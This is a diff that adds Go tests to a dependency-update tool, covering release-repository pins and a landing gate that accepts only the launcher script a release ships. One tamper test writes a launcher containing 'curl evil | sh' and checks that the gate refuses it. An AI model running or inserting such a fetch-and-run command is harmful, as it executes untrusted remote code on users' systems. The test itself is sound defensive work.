@@ -249,6 +249,80 @@ func TestProposeOpensAPinOnlyPR(t *testing.T) {
 	}
 }
 
+// onReleasesRepo is body, a settingsFor, with engine.releases naming
+// acme/acme-distro.
+func onReleasesRepo(f settings.Format, body string) string {
+	switch f {
+	case settings.TOML:
+		return strings.Replace(body, "version =", "releases = \"acme/acme-distro\"\nversion =", 1)
+	case settings.JSON:
+		return strings.Replace(body, `"version":`, `"releases": "acme/acme-distro", "version":`, 1)
+	}
+	return strings.Replace(body, "  version:", "  releases: \"acme/acme-distro\"\n  version:", 1)
+}
+
+// A pin on engine.releases takes the version that repository's latest
+// release.json names, fetched from its release and never from npm.
+func TestAReleasesPinProposesTheLatestRelease(t *testing.T) {
+	t.Parallel()
+	for _, f := range settings.Formats {
+		w := newWorld(t, f)
+		onReleases := onReleasesRepo(f, settingsFor(f, v1, pin1))
+		if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(f)), []byte(onReleases), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		gitRun(t, w.repo, "commit", "-q", "-am", "releases")
+		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.mainRun(t, "success")
+		w.publish(t, v2, relOpts{})
+		w.reg.toReleases(t, "acme/acme-distro", pkg, v2)
+		w.publish(t, v3, relOpts{})
+		d := w.deps(t)
+		d.ReleasesHost = w.reg.srv.URL
+		v, err := Engine(d, Options{})
+		if err != nil || v != "opened #1 for "+v2 {
+			t.Fatalf("%s: %q %v\n%s", f, v, err, w.out)
+		}
+		for _, r := range w.reg.requests() {
+			if !strings.HasPrefix(r, "/acme/acme-distro/") {
+				t.Errorf("%s: read %s, not the releases repository", f, r)
+			}
+		}
+		committed := gitRun(t, w.bare, "show", "claudinite/engine-"+v2+":"+settings.RelPath(f)) + "\n"
+		e, err := settings.ReadEngine([]byte(committed), f)
+		if err != nil || e.Version != v2 || e.Releases != "acme/acme-distro" {
+			t.Errorf("%s: committed settings %+v %v", f, e, err)
+		}
+		if err := CheckPin(d, e); err != nil {
+			t.Errorf("%s: the proposed pin does not check: %v", f, err)
+		}
+		e.Manifest = pin1
+		if err := CheckPin(d, e); err == nil {
+			t.Errorf("%s: a pin whose manifest is not the release's checked", f)
+		}
+	}
+}
+
+// A release.json naming the pin, or an older version, proposes nothing.
+func TestAReleasesPinAtTheLatestReleaseIsUpToDate(t *testing.T) {
+	t.Parallel()
+	w := newWorld(t, settings.YAML)
+	w.publish(t, v1, relOpts{})
+	w.reg.toReleases(t, "acme/acme-distro", pkg, v1)
+	onReleases := onReleasesRepo(settings.YAML, settingsFor(settings.YAML, v1, pin1))
+	if err := os.WriteFile(filepath.Join(w.repo, settings.RelPath(settings.YAML)), []byte(onReleases), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	gitRun(t, w.repo, "commit", "-q", "-am", "releases")
+	gitRun(t, w.repo, "push", "-q", "origin", "main")
+	w.mainRun(t, "success")
+	d := w.deps(t)
+	d.ReleasesHost = w.reg.srv.URL
+	if v, err := Engine(d, Options{}); err != nil || v != "up to date" {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+}
+
 func TestVerifyBreakOpensNoPR(t *testing.T) {
 	t.Parallel()
 	w := newWorld(t, settings.YAML)
@@ -952,5 +1026,83 @@ func TestProposeWaitsForNpmToServeTheTarballs(t *testing.T) {
 	}
 	if total != npmreg.ServeWait {
 		t.Errorf("waited %v in all, want npmreg.ServeWait (%v)", total, npmreg.ServeWait)
+	}
+}
+
+// The update PR carries the launcher the new engine ships, so a member
+// takes a launcher change with the pin, and the landing gate accepts that
+// launcher and no other.
+func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
+	t.Parallel()
+	branch := "claudinite/engine-" + v2
+	propose := func(t *testing.T, o relOpts) (*world, string) {
+		w := newWorld(t, settings.YAML)
+		p := filepath.Join(w.repo, filepath.FromSlash(LauncherPath))
+		_ = os.WriteFile(p, []byte("#!/bin/sh\n# launcher of "+v1+"\n"), 0o755)
+		gitRun(t, w.repo, "add", "-A")
+		gitRun(t, w.repo, "commit", "-q", "-m", "the launcher "+v1+" shipped")
+		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.mainRun(t, "success")
+		w.publish(t, v2, o)
+		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
+			t.Fatalf("%q %v\n%s", v, err, w.out)
+		}
+		return w, gitRun(t, w.bare, "rev-parse", branch)
+	}
+
+	w, sha := propose(t, relOpts{})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != LauncherPath+"\n"+settings.RelPath(settings.YAML) {
+		t.Errorf("branch changes %q", got)
+	}
+	if got := gitRun(t, w.bare, "show", branch+":"+LauncherPath); got != "#!/bin/sh\n# launcher of "+v2 {
+		t.Errorf("the PR's launcher reads %q", got)
+	}
+	w.hub.pulls[0].HeadSHA = sha
+	if v, err := Land(w.deps(t), 1, sha); err != nil || v != "landed "+v2 {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+
+	// A repo holding no launcher gets none from the update, and the gate
+	// refuses a PR that adds one, even the one the release ships.
+	w = newWorld(t, settings.YAML)
+	w.publish(t, v2, relOpts{})
+	if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("a repo with no launcher: branch changes %q", got)
+	}
+	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
+	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
+	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\n# launcher of "+v2+"\n"), 0o755)
+	gitRun(t, w.repo, "add", "-A")
+	gitRun(t, w.repo, "commit", "-q", "-m", "add the launcher")
+	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.hub.pulls[0].HeadSHA = w.head(t)
+	gitRun(t, w.repo, "checkout", "-q", "main")
+	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "only cn init writes") {
+		t.Errorf("an added launcher landed: %v", err)
+	}
+
+	// A release whose signed manifest hashes no launcher leaves the
+	// member's alone.
+	w, _ = propose(t, relOpts{unhashedLauncher: true})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("an unhashed launcher's release changes %q", got)
+	}
+
+	w, _ = propose(t, relOpts{})
+	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
+	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
+	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
+	gitRun(t, w.repo, "commit", "-q", "-am", "tamper")
+	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.hub.pulls[0].HeadSHA = w.head(t)
+	gitRun(t, w.repo, "checkout", "-q", "main")
+	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "not the launcher") {
+		t.Errorf("a launcher the release did not ship landed: %v", err)
+	}
+	if len(w.hub.called("merge")) != 0 {
+		t.Error("merged")
 	}
 }
